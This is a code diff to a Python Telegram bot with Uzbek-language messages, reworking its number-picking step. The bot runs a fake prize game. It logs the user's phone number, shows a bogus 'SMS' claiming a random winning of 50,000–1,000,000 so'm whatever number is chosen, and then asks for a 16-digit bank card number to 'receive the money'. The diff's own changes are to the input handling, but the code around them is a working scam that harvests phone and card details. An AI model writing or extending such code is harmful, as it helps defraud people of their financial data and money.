@@ -89,7 +89,8 @@ TEXTS = {
     ),
     'phone_invalid': "❌ Noto'g'ri raqam. Qaytadan kiriting.",
     'phone_ok': "✅ Telefon raqamingiz qabul qilindi: {}",
-    'number_grid': "🎮 O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini bosing:",
+    'number_pick': "🎮 O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini yozing:",
+    'number_invalid': "❌ Faqat 1 dan 9 gacha bitta raqam yozing.",
     'prize_sms': "📩 SMS keldi:\n\nSiz {} so'm yutuq egasiga aylandingiz! 🎉",
     'card_prompt': "💳 Pulni kartangizga tushirish uchun 16 xonali karta raqamingizni kiriting:",
     'card_invalid': "❌ Karta raqami noto'g'ri. 16 xonali raqam kiriting:",
@@ -173,23 +174,6 @@ def build_phone_keyboard():
     return markup
 
 
-def build_number_grid():
-    markup = types.InlineKeyboardMarkup(row_width=3)
-    row1 = [types.InlineKeyboardButton("1", callback_data="pick_1"),
-            types.InlineKeyboardButton("2", callback_data="pick_2"),
-            types.InlineKeyboardButton("3", callback_data="pick_3")]
-    row2 = [types.InlineKeyboardButton("4", callback_data="pick_4"),
-            types.InlineKeyboardButton("5", callback_data="pick_5"),
-            types.InlineKeyboardButton("6", callback_data="pick_6")]
-    row3 = [types.InlineKeyboardButton("7", callback_data="pick_7"),
-            types.InlineKeyboardButton("8", callback_data="pick_8"),
-            types.InlineKeyboardButton("9", callback_data="pick_9")]
-    markup.row(*row1)
-    markup.row(*row2)
-    markup.row(*row3)
-    return markup
-
-
 def build_channel_menu():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -262,8 +246,28 @@ def process_phone(chat_id, phone_raw):
     log_action(chat_id, "phone_received", phone)
     set_step(chat_id, 'number_pick')
 
-    bot.send_message(chat_id, get_text('phone_ok').format(phone))
-    bot.send_message(chat_id, get_text('number_grid'), reply_markup=build_number_grid())
+    bot.send_message(chat_id, get_text('phone_ok').format(phone), reply_markup=types.ReplyKeyboardRemove())
+    bot.send_message(chat_id, get_text('number_pick'))
+
+
+def process_number_pick(chat_id, text):
+    picked = (text or '').strip()
+    if picked not in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
+        bot.send_message(chat_id, get_text('number_invalid'))
+        return
+
+    state = get_state(chat_id)
+    state['picked_number'] = picked
+
+    prize = random.randint(50000, 1000000)
+    prize = max(50000, (prize // 1000) * 1000)
+    state['prize'] = prize
+
+    bot.send_message(chat_id, get_text('prize_sms').format(format_sum(prize)))
+    log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
+
+    set_step(chat_id, 'card')
+    bot.send_message(chat_id, get_text('card_prompt'))
 
 
 def process_card(chat_id, text):
@@ -329,40 +333,7 @@ def start_handler(message):
     )
 
 
-# ============== RAQAM TUGMALARI ==============
-@bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('pick_'))
-def pick_number_handler(call):
-    chat_id = call.message.chat.id
-
-    try:
-        state = get_state(chat_id)
-        step = state.get('step')
-
-        if step != 'number_pick':
-            safe_answer_callback(call, "⚠️ Avval /start bosing va telefon kiriting")
-            return
-
-        picked = call.data.replace('pick_', '')
-        state['picked_number'] = picked
-
-        prize = random.randint(50000, 1000000)
-        prize = max(50000, (prize // 1000) * 1000)
-        state['prize'] = prize
-
-        safe_answer_callback(call, f"✅ {picked} tanlandi!")
-
-        bot.send_message(chat_id, get_text('prize_sms').format(format_sum(prize)))
-        log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
-
-        set_step(chat_id, 'card')
-        bot.send_message(chat_id, get_text('card_prompt'))
-
-    except Exception as e:
-        print(f"pick_number_handler xatolik: {e}")
-        traceback.print_exc()
-        safe_answer_callback(call, "❌ Xatolik. /start bosing")
-
-
+# ============== ADMIN CALLBACK ==============
 @bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('admin_'))
 def admin_callback_handler(call):
     handle_admin_callback(call)
@@ -376,6 +347,11 @@ def phone_step_handler(message):
         process_phone(chat_id, message.contact.phone_number)
     else:
         process_phone(chat_id, message.text)
+
+
+@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'number_pick')
+def number_pick_step_handler(message):
+    process_number_pick(message.chat.id, message.text)
 
 
 @bot.message_handler(func=lambda m: get_step(m.chat.id) == 'card')
